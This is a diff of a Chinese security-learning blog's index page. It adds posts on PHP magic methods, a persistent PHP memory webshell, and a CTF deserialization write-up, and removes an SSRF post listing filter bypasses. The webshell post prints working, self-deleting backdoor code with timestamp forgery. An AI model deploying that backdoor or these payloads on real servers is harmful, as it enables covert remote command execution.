@@ -152,6 +152,116 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2021/08/08/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/">
+                PHP魔术方法
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2021-08-08</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>@<a href="PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95">TOC</a></p>
+<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>PHP中把以两个下划线__开头的方法称为魔术方法，这些方法在PHP中充当了举足轻重的作用，它们服务于类和对象。</p>
+<h2 id="出现原因"><a href="#出现原因" class="headerlink" title="出现原因"></a>出现原因</h2><p>PHP虽然是面向对象的语言，但是一些面向对象的标准并不完善，例如重载（函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法），我们可以通过一些魔术方法弥补。</p>
+<h2 id="魔术方法详细解释"><a href="#魔术方法详细解释" class="headerlink" title="魔术方法详细解释"></a>魔术方法详细解释</h2><p><strong>__construct()，类的构造函数<br>__destruct()，类的析构函数<br>__call()，在对象中调用一个不可访问方法时调用<br>__callStatic()，用静态方式中调用一个不可访问方法时调用<br>__get()，获得一个类的成员变量时调用<br>__set()，设置一个类的成员变量时调用<br>__sleep()，执行serialize()时，先会调用这个函数<br>__wakeup()，执行unserialize()时，先会调用这个函数<br>__toString()，类被当成字符串时的回应方法<br>__invoke()，调用函数的方式调用一个对象时的回应方法<br>__set_state()，调用var_export()导出类时，此静态方法会被调用。<br>__clone()，当对象复制完成时调用</strong></p>
+<p>一、__construct()，类的构造函数、__destruct()，类的析构函数<br>__construct 构造方法，当一个对象创建时调用此方法，而__destruct()是在一个对象销毁时调用，也就是PHP的gc机制</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileRead</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> protected $handle = NULL;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  $this-&gt;handle = fopen(...);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  fclose($this-&gt;handle);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>二、__call()、__callStatic()<br>当使用这些未定义的方法时就会进入这两个函数中。比如说我们调用$ a-&gt;b();这个方法，但其实在$a的类模板中并没有b()方法，这时就会进入__call()方法进行处理。__callStatic()则是通过静态调用时如果没有定义对应的方法，就进入到__callStatic()方法中，如A::b()，并没有定义b()方法，这时就进入了__callStatic()中进行处理。<br>三、__set()和__get()<br>__set()和__get()是操作不可访问的属性。注意，这里并不是指没有定义的属性，如果定义为private的属性也可以通过这两个魔术方法来进行定义，当然，也包括未定义的属性。<br>四、__sleep()和__wakeup()<br>当我们在执行serialize()和unserialize()时，会先调用这两个函数。例如我们在序列化一个对象时，这个对象有一个数据库链接，想要在反序列化中恢复链接状态，则可以通过重构这两个函数来实现链接的恢复，<br>这里需要注意的是，__sleep()需要返回一个数组，而这个数组对应着类中的属性名。通常来说，它们可以在序列化前进行数据清理工作，或者反序列化前进行数据的预处理工作。比如序列化前关闭数据库连接或者反序列化前打开数据库连接。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> protected $link;</span><br><span class="line"> private $server, $username, $password, $db;</span><br><span class="line"></span><br><span class="line"> public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$server, $username, $password, $db</span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">  $this-&gt;server = $server;</span><br><span class="line">  $this-&gt;username = $username;</span><br><span class="line">  $this-&gt;password = $password;</span><br><span class="line">  $this-&gt;db = $db;</span><br><span class="line">  $this-&gt;connect();</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> private <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">  $this-&gt;link = mysql_connect($this-&gt;server, $this-&gt;username, $this-&gt;password);</span><br><span class="line">  mysql_select_db($this-&gt;db, $this-&gt;link);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> public <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> array(<span class="string">&#x27;server&#x27;</span>, <span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;db&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> public <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">  $this-&gt;connect();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>五、__toString()<br>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将出现致命错误。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> public <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;this is a object&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class = <span class="keyword">new</span> TestClass();</span><br><span class="line">echo $class;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>六、__clone()<br>此方法在复制对象时被调用。我们知道在php中.  $a为一个对象， $b= $a时。 $b为 $ a的引用。当$a发生改变时。 $b也会随之发生变化。那么为了使 $b不发生变化，我们需要用 $b=clone $a;<br>那么，当 $a在调用clone的时候，引擎会自动调用__clone()方法<br>七、Invoke<br>在php中这个方法用于，把对象当方法用的时候。此方法会被调用。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Invoke</span> </span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        echo <span class="string">&#x27;I can run&#x27;</span>.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$invoke = <span class="keyword">new</span> Invoke();</span><br><span class="line">$invoke();</span><br></pre></td></tr></table></figure>
+<p>七、__set_state()<br>了解这个方法前，需要先知道var_export()函数,var_export()和var_dump()类似，输出一个变量的字符串表示。他与var_dump的区别在于它的返回结果的是合法的<br>php代码.此代码可以被eval执行. 注意：此方法是一个静态方法，且在php5.1以上版本才支持。 </p>
+<h2 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup"></a>绕过__wakeup</h2><p>一、为什么要绕过__wakeup<br>举个例子</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    private $username = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    private $password = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$password</span>)</span>&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $this-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($this-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            echo <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            echo $this-&gt;username;echo <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            echo <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            echo $this-&gt;password;echo <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($this-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">global</span> $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们可知__wakeup将username的值设定为guest，题中需要为admin,而且根据__wake的特性，在反序列化中会提前执行，所以需要绕过<br>二、绕过方法：当成员属性数目大于实际数目时可绕过<br>题目来源：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_53549425/article/details/119293469?spm=1001.2014.3001.5501">buuctf_php</a></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2021/08/08/PHP%E4%B8%8D%E6%AD%BB%E9%A9%AC/">
+                PHP不死马
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2021-08-08</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>@<a href="%E8%BF%99%E9%87%8C%E5%86%99%E7%9B%AE%E5%BD%95%E6%A0%87%E9%A2%98">TOC</a></p>
+<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>内存性木马即不死马，一般会删除自身以进程的形式循环创建隐蔽的后门。内存马是无文件攻击的一种技术手段,那我们不得不先简单介绍一下无文件攻击。无文件攻击可以有效地躲避传统安全软件的检测,它们可以在系统的内存中远程加载执行、驻留在注册表中或滥用常用的白名单工具,例如PowerShell,Windows Management Instrumentation(WMI)和PsExec等。无文件攻击技术允许攻击者访问系统,从而启用后续的恶意活动。通过操纵漏洞利用程序、合法工具、宏和脚本,攻击者可以破坏系统、提升特权或在网络上横向传播恶意代码。而且,无文件威胁在执行后不会留下任何痕迹,这使其难以被检测和清除。<br><img src="https://img-blog.csdnimg.cn/7f789ac0abca4ed5bc04ee0452748ca5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">在这里我们只介绍PHP内存马。<br>PHP内存马利用脚本解析执行特性，调用PHP运行时文件访问接口动态加载恶意代码，之后调用PHP运行时外部命令执行接口执行恶意代码。</p>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p><img src="https://img-blog.csdnimg.cn/4be572e47cd440a7b25b06afacef60c1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>① 当PHP-FPM启用时，通过Fastcgi协议（Fastcgi协议是服务器中间件和后端进行数据交换的协议）向PHP-FPM发起请求执行任意文件。如果PHP-FPM可被外部访问，攻击者通过Fastcgi协议可直接请求PHP-FPM执行”任意文件”。<br><img src="https://img-blog.csdnimg.cn/b9f8ef2c5f2143ba9b955fc3f39b2936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">② 内存驻留Webshell通常会在php执行起来后，删除php文件本体。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">	set_time_limit(<span class="number">0</span>);</span><br><span class="line">	unlink(__FILE__);</span><br><span class="line">	$file = <span class="string">&#x27;/var/www/dvwa/.ski12.php&#x27;</span>;</span><br><span class="line">	$code = <span class="string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;cdd7b7420654eb16c1e1b748d5b7c5b8&quot;)&#123;@system($_POST[a]);&#125;?&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		file_put_contents($file, $code);</span><br><span class="line">		system(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .ski12.php&#x27;</span>);</span><br><span class="line">		usleep(<span class="number">5000</span>);</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>ignore_user_abort()函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。</p>
+<p>set_time_limit()函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。</p>
+<p>unlink(<strong>FILE</strong>)删除文件本身，以起到隐蔽自身的作用。</p>
+<p>while循环内每隔usleep(5000)即写新的后门文件，中间system()执行的命令用于修改文件的创建或修改时间，可以绕过“find –name &#39;*.php&#39; –mmin -10”命令检测最近10分钟修改或新创建的PHP文件，但不一定有用，可选。</p>
+<p>至于最后生成的隐蔽后门在需要校验一个POST参数的MD5值，原因在于防止其他人可以进行利用。</p>
+<h2 id="防护原理"><a href="#防护原理" class="headerlink" title="防护原理"></a>防护原理</h2><p>通过对PHP执行进程进行监控，关联分析敏感行为以识别此类攻击</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2021/08/08/buuctf_php/">
+                buuctf_php
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2021-08-08</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="buuctf-php"><a href="#buuctf-php" class="headerlink" title="buuctf_php"></a>buuctf_php</h1><p><img src="https://img-blog.csdnimg.cn/83ed7f7f9b4947a98b422d117f12f4f8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们来看下这道题，打开后有提示备份文件，对于备份文件我们可以使用御剑扫描后台目录<br><img src="https://img-blog.csdnimg.cn/b4ec4bc346c84b18a315e7f988807dcc.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载这个<a target="_blank" rel="noopener" href="http://www.zip后发现/">www.zip后发现</a><br><img src="https://img-blog.csdnimg.cn/1b9a8035097d49d3a039e87b97e7a05a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有这些文件，首先打开flag.php，发现不是我们想要的flag，所以我们打开class.php，</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    private $username = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    private $password = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$password</span>)</span>&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $this-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($this-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            echo <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            echo $this-&gt;username;echo <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            echo <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            echo $this-&gt;password;echo <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($this-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">global</span> $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>首先我们注意关于username和password都是private，这个在下面的解答中会用到<br><img src="https://img-blog.csdnimg.cn/bd528dc12f7349cb9d115330f452f4f5.png" alt="在这里插入图片描述"><br>然后打开index.php观察这个代码，由unserialize()知涉及反序列化，再打开class.php<br><img src="https://img-blog.csdnimg.cn/8e60ca21b74e45379725cf6c5620e08f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们可以知道只有username为admin时且password为100时，才会输出flag<br>而反序列化后调用_wakeup会直接覆盖输入的用户名。一个简单的办法是直接在class下面创建一个对象然后序列化。由此我们可以构造playload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a= new Name(&#x27;admin&#x27;,100);</span><br><span class="line">$b= serialize($a);</span><br><span class="line">var_dump($b);</span><br></pre></td></tr></table></figure>
+<p>O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}<br>此时我们需要注意两个点，一个是private属性序列化:%00类名%00成员名，所有要在Name、username、以及password前面加%00，另一个是关于_wakeup函数，因为要绕过wakeup,把Name后的数字改成3，**当反序列化时，若属性个数大于真实属性个数时，则会跳过__wakeup()**，本题得解<br><img src="https://img-blog.csdnimg.cn/17a850d19ba44de6bd1e46f0ba2a722a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2021/08/01/%E8%AE%A1%E7%BD%91%E7%BD%91%E7%BB%9C%E7%AF%87/">
                 计网网络篇
             </a>
@@ -423,150 +533,6 @@
 
 </div>
             
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2021/06/19/SSRF/">
-                SSRF
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2021-06-19</span>
-            
-            
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p>@<a href="SSRF">TOC</a></p>
-<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p> SSRF（Server-Side Request Forgery:服务器端请求伪造）是一种由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。正是因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF的攻击目标是攻击者无法直接访问的内网系统。 </p>
-<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p> SSRF漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能而没有对目标地址做过滤和限制。 例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等，利用的就是服务端请求伪造，SSRF漏洞可以利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器</p>
-<h1 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h1><p>攻击者想要访问主机B上的服务，但是由于存在防火墙或者主机B是属于内网主机等原因导致攻击者无法直接访问主机B。而服务器A存在SSRF漏洞，这时攻击者可以借助服务器A来发起SSRF攻击，通过服务器A向主机B发起请求，从而获取主机B的一些信息。</p>
-<p><img src="https://img-blog.csdnimg.cn/20210617095831518.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h1 id="危害："><a href="#危害：" class="headerlink" title="危害："></a>危害：</h1><p>1、对外网、服务器所在内网、服务器本地进行端口扫描，获取一些服务的banner信息等。</p>
-<p>2、攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等。</p>
-<p>3、对内网Web应用进行指纹识别，识别企业内部的资产信息。</p>
-<p>4、击内外网的Web应用，主要是使用HTTP GET/POST请求就可以实现的攻击，（比如Struts2漏洞利用，SQL注入等）<br>5、利用file协议读取服务器本地文件等。</p>
-<h1 id="SSRF的限制："><a href="#SSRF的限制：" class="headerlink" title="SSRF的限制："></a>SSRF的限制：</h1><p>限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求。</p>
-<p>限制域名只能为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a></p>
-<p>限制不能访问内网的IP，以防止对内网进行攻击。</p>
-<p>屏蔽返回的详细信息。</p>
-<p>禁止不常用的协议，仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp://等引起的问题。</p>
-<h1 id="SSRF漏洞绕过方法："><a href="#SSRF漏洞绕过方法：" class="headerlink" title="SSRF漏洞绕过方法："></a>SSRF漏洞绕过方法：</h1><p>1.@　　　　　　　　　　<a target="_blank" rel="noopener" href="http://abc.com@127.0.0.1/">http://abc.com@127.0.0.1</a></p>
-<p>2.添加端口号　　　　　　<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p>
-<p>3.短地址　　　　　　　　<a target="_blank" rel="noopener" href="https://0x9.me/cuGfD">https://0x9.me/cuGfD</a></p>
-<p>4.可以指向任意ip的域名　 xip.io</p>
-<p>5.ip地址转换成进制来访问 192.168.0.1=32322</p>
-<p>扩展起来 讲一下</p>
-<h3 id="利用HTTP基本身份认证的方式绕过"><a href="#利用HTTP基本身份认证的方式绕过" class="headerlink" title="利用HTTP基本身份认证的方式绕过"></a>利用HTTP基本身份认证的方式绕过</h3><p>如果目标代码限制访问的域名只能为 <a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a>，那么我们可以采用HTTP基本身份认证的方式绕过。即 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@:[http://www.xxx.com@www.evil.com](http://www.evil.com/)</span><br></pre></td></tr></table></figure>
-
-<h2 id="利用302跳转绕过内网IP"><a href="#利用302跳转绕过内网IP" class="headerlink" title="利用302跳转绕过内网IP"></a>利用302跳转绕过内网IP</h2><p>绕过对内网ip的限制我们可以利用302跳转的方法，有以下两种。</p>
